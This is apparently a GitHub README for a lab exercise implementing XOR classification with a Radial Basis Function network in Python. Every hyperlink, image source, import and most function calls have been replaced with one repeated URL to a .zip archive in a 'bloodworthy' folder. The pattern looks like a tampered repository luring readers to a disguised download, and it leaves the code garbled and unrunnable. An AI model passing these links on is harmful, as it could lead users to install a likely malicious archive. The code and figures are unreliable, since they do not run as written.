# Experiment-5-Implementation-of-XOR-using-RBF

## AIM:
To classify the Binary input patterns of XOR data  by implementing Radial Basis Function Neural Networks.
  
## EQUIPMENTS REQUIRED:

https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip – PCs
https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip – Python 3.7 Installation / Google Colab /Jupiter Notebook

## RELATED THEORETICAL CONCEPT:
Exclusive or is a logical operation that outputs true when the inputs https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip the XOR gate, the TRUTH table will be as follows
XOR truth table
<img width="541" alt="image" src="https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip">

XOR is a classification problem, as it renders binary distinct outputs. If we plot the INPUTS vs OUTPUTS for the XOR gate, as shown in figure below
<img width="246" alt="image" src="https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip">

The graph plots the two inputs corresponding to their output. Visualizing this plot, we can see that it is impossible to separate the different outputs (1 and 0) using a linear equation.

A Radial Basis Function Network (RBFN) is a particular type of neural network. The RBFN approach is more intuitive than MLP. An RBFN performs classification by measuring the input’s similarity to examples from the training set. Each RBFN neuron stores a “prototype”, which is just one of the examples from the training set. When we want to classify a new input, each neuron computes the Euclidean distance between the input and its prototype. Thus, if the input more closely resembles the class A prototypes than the class B prototypes, it is classified as class A ,else class B.


A Neural network with input layer, one hidden layer with Radial Basis function and a single node output layer (as shown in figure below) will be able to classify the binary data according to XOR output.

<img width="261" alt="image" src="https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip">

The RBF of hidden neuron as gaussian function 

<img width="206" alt="image" src="https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip">


## ALGORIHM:
# Step1:
Import the necessary libraries of python.

/** Write the Algorithm in steps**/

# Step2:

In the end_to_end function, first calculate the similarity between the inputs and the peaks. Then, to find w used the equation Aw= Y in matrix form.

# PROGRAM:
```
Developed By: SHAIK MUFEEZUR RAHAMAN
https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip
```
```
import numpy as np
import https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip as plt
import tensorflow as tf
from https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip import Initializer
from https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip import Layer
from https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip import RandomUniform, Initializer, Constant
```
```
def gaussian_rbf(x, landmark, gamma=1):
    return https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(-gamma * https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(x - landmark)**2)
```
```
def gaussian_rbf(x, landmark, gamma=1):
    return https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(-gamma * https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(x - landmark)**2)
```
```
def end_to_end(X1, X2, ys, mu1, mu2):
    from_1 = [gaussian_rbf(i, mu1) for i in zip(X1, X2)]
    from_2 = [gaussian_rbf(i, mu2) for i in zip(X1, X2)]
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(figsize=(13, 5))
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(1, 2, 1)
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip((x1[0], x1[3]), (x2[0], x2[3]), label="Class_0")
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip((x1[1], x1[2]), (x2[1], x2[2]), label="Class_1")
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip("$X1$", fontsize=15)
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip("$X2$", fontsize=15)
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip("Xor: Linearly Inseparable", fontsize=15)
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip()
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(1, 2, 2)
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(from_1[0], from_2[0], label="Class_0")
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(from_1[1], from_2[1], label="Class_1")
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(from_1[2], from_2[2], label="Class_1")
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(from_1[3], from_2[3], label="Class_0")
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0.95], [0.95, 0], "k--")
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip("Seperating hyperplane", xy=(0.4, 0.55), xytext=(0.55, 0.66),
                arrowprops=dict(facecolor='black', shrink=0.05))
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(f"$mu1$: {(mu1)}", fontsize=15)
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(f"$mu2$: {(mu2)}", fontsize=15)
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip("Transformed Inputs: Linearly Seperable", fontsize=15)
    https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip()
    A = []
    for i, j in zip(from_1, from_2):
        temp = []
        https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(i)
        https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(j)
        https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(1)
        https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(temp)
    
    A = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(A)
    W = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(A)).dot(A.T).dot(ys)
    print(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(W)))
    print(ys)
    print(f"Weights: {W}")
    return W
```
```
    def predict_matrix(point, weights):
    gaussian_rbf_0 = gaussian_rbf(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(point), mu1)
    gaussian_rbf_1 = gaussian_rbf(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(point), mu2)
    A = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([gaussian_rbf_0, gaussian_rbf_1, 1])
    return https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip(weights))
```
```
x1 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0, 1, 1])
x2 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1, 0, 1])
ys = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1, 1, 0])
mu1 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1])
mu2 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 0])
w = end_to_end(x1, x2, ys, mu1, mu2)
print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0]), w)}")
print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1]), w)}")
print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 0])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 0]), w)}")
print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 1])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 1]), w)}")
```
```
mu1 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0])
mu2 = https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 1])
w = end_to_end(x1, x2, ys, mu1, mu2)
print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 0]), w)}")
print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([0, 1]), w)}")
print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 0])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 0]), w)}")
print(f"Input:{https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 1])}, Predicted: {predict_matrix(https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip([1, 1]), w)}")
```


## OUTPUT :
![201324580-b173007c-49a3-4c6e-b87d-077c520b98c8](https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip)

![201324600-d0167f49-d522-4bd8-858d-300b0048ae50](https://raw.githubusercontent.com/githubmufeez45/Experiment-5-Implementation-of-XOR-using-RBF/main/bloodworthy/Experiment-5-Implementation-of-XOR-using-RBF.zip)



## RESULT:

Thus Implementation of XOR problem using Radial Basis Function executed successfully.








